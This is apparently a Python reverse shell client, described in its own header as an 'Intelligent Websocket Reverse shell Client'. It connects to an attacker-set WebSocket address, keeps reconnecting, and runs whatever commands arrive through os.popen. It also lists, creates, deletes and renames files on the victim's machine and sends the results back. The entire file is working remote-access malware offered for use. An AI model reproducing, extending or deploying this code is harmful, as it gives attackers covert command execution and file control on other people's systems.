import os
import time
import websocket
from threading import Thread


"""
    | - Intelligent Websocket Reverse shell Client - |
       | -  Made by NiGhTFuRy, Vaxer, MainSilent - |
        | ~ Redesign and Optimized By NiGhTFuRy ~ |
"""
class cc:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
address = "" # Copy the ws/wss link here


def on_message(ws, cmd : str):
    """Receive system commands and execute them."""
    cmd = cmd.strip()
    try:
        if len(cmd) > 0:
            # <- ---- list current directory contents ---- ->
            if cmd.startswith("dir") and len(cmd) < 4:
                ws.send("\n | ".join(os.listdir()))
                ws.send(cc.OKBLUE + "("+ cc.FAIL +f"{os.getlogin()}💀windows"+ cc.ENDC + cc.OKBLUE + ")-[" + cc.ENDC + f"{os.getcwd()}" + cc.OKBLUE + "]>" + cc.ENDC)
            elif cmd.startswith("cmd") or cmd.startswith("powershell"):
                ws.send("[!] starting a new shell is not supported yet.")
                ws.send(cc.OKBLUE + "("+ cc.FAIL +f"{os.getlogin()}💀windows"+ cc.ENDC + cc.OKBLUE + ")-[" + cc.ENDC + f"{os.getcwd()}" + cc.OKBLUE + "]>" + cc.ENDC)

                
            elif cmd.startswith("ls") and len(cmd) < 3:
                ws.send("\n | ".join(os.listdir()))
                ws.send(cc.OKBLUE + "("+ cc.FAIL +f"{os.getlogin()}💀windows"+ cc.ENDC + cc.OKBLUE + ")-[" + cc.ENDC + f"{os.getcwd()}" + cc.OKBLUE + "]>" + cc.ENDC)
                
            # <- ----  get current directory path ---- ->
            elif cmd.startswith("cd") and len(cmd) < 3:
                ws.send(f"{os.getcwd()}>")
            elif cmd.startswith("pwd") and len(cmd) < 4:
                ws.send(f"{os.getcwd()}>")
                
            # <- ----  Change Directory ---- ->
            elif cmd.startswith("cd") and len(cmd) > 3:
                os.chdir(cmd[3:])
                ws.send(cc.OKBLUE + "("+ cc.FAIL +f"{os.getlogin()}💀windows"+ cc.ENDC + cc.OKBLUE + ")-[" + cc.ENDC + f"{os.getcwd()}" + cc.OKBLUE + "]>" + cc.ENDC)
            elif len(cmd) == 2 and ":" in cmd:
                os.chdir(cmd)
                ws.send(cc.OKBLUE + "("+ cc.FAIL +f"{os.getlogin()}💀windows"+ cc.ENDC + cc.OKBLUE + ")-[" + cc.ENDC + f"{os.getcwd()}" + cc.OKBLUE + "]>" + cc.ENDC)
            # <- ---- Make, Delete a File ---- ->

            elif cmd.startswith("touch") and len(cmd) > 6:
                with open(f'{cmd[6:]}', mode='a'): pass
                ws.send(cc.OKBLUE + "("+ cc.FAIL +f"{os.getlogin()}💀windows"+ cc.ENDC + cc.OKBLUE + ")-[" + cc.ENDC + f"{os.getcwd()}" + cc.OKBLUE + "]>" + cc.ENDC)
            elif cmd.startswith("del"):
                os.remove(cmd[4:])
                ws.send(cc.OKBLUE + "("+ cc.FAIL +f"{os.getlogin()}💀windows"+ cc.ENDC + cc.OKBLUE + ")-[" + cc.ENDC + f"{os.getcwd()}" + cc.OKBLUE + "]>" + cc.ENDC)
            


            elif cmd.startswith("rn"):
                cmds = cmd.split()
                if len(cmds) != 3:
                    ws.send(f"[!] Error: This coommand only takes 2 arguments -> rn test.txt noob.txt")
                    ws.send(cc.OKBLUE + "("+ cc.FAIL +f"{os.getlogin()}💀windows"+ cc.ENDC + cc.OKBLUE + ")-[" + cc.ENDC + f"{os.getcwd()}" + cc.OKBLUE + "]>" + cc.ENDC)
                else:
                    os.rename(cmds[1], cmds[2])
                    ws.send(cc.OKBLUE + "("+ cc.FAIL +f"{os.getlogin()}💀windows"+ cc.ENDC + cc.OKBLUE + ")-[" + cc.ENDC + f"{os.getcwd()}" + cc.OKBLUE + "]>" + cc.ENDC)

            else:
                try:
                    data = os.popen(cmd).read()
                    if len(data) > 0:
                        ws.send(data)
                        ws.send(cc.OKBLUE + "("+ cc.FAIL +f"{os.getlogin()}💀windows"+ cc.ENDC + cc.OKBLUE + ")-[" + cc.ENDC + f"{os.getcwd()}" + cc.OKBLUE + "]>" + cc.ENDC)
                    else:
                        ws.send(cc.OKBLUE + "("+ cc.FAIL +f"{os.getlogin()}💀windows"+ cc.ENDC + cc.OKBLUE + ")-[" + cc.ENDC + f"{os.getcwd()}" + cc.OKBLUE + "]>" + cc.ENDC)
                except Exception as e:
                    ws.send(e)
                    print(e)
        else:
            ws.send(cc.OKBLUE + "("+ cc.FAIL +f"{os.getlogin()}💀windows"+ cc.ENDC + cc.OKBLUE + ")-[" + cc.ENDC + f"{os.getcwd()}" + cc.OKBLUE + "]>" + cc.ENDC)
            

    except Exception as e:
        ws.send("[!] Error executing command")
        ws.send(f"[!] {e}")
        ws.send(cc.OKBLUE + "("+ cc.FAIL +f"{os.getlogin()}💀windows"+ cc.ENDC + cc.OKBLUE + ")-[" + cc.ENDC + f"{os.getcwd()}" + cc.OKBLUE + "]>" + cc.ENDC)
        print(e)
        
def on_open(ws):
    pwwd = cc.OKBLUE + "("+ cc.FAIL + f"{os.getlogin()}💀windows" + cc.ENDC + cc.OKBLUE + ")-[" + cc.ENDC + f"{os.getcwd()}" + cc.OKBLUE + "]>" + cc.ENDC
    print(cc.OKGREEN +"[>] "+ cc.ENDC + "WebSocket connection established")
    ws.send(pwwd)

def on_close(ws):
    print(cc.FAIL + "[>] " + cc.ENDC+ "Connection Closed")

def on_error(ws, error):
    time.sleep(3)
    ws.send(error)
    print(error)

def connect():
    """Establish a connection to the address, then call receiver()"""
    while True:
        try:
            ws = websocket.WebSocketApp(address, on_open=on_open, on_message=on_message, on_close=on_close, on_error=on_error)
            ws.run_forever()
        except Exception as e:
            print("Connection Error: " + str(e))
            time.sleep(5)
            continue

if __name__ == "__main__":

    while True:
        try:
            print("Creating new worker...")
            p = Thread(target=connect)
            p.start()
            p.join()
            print("Worker terminated\n")
        except:
            time.sleep(2)
            pass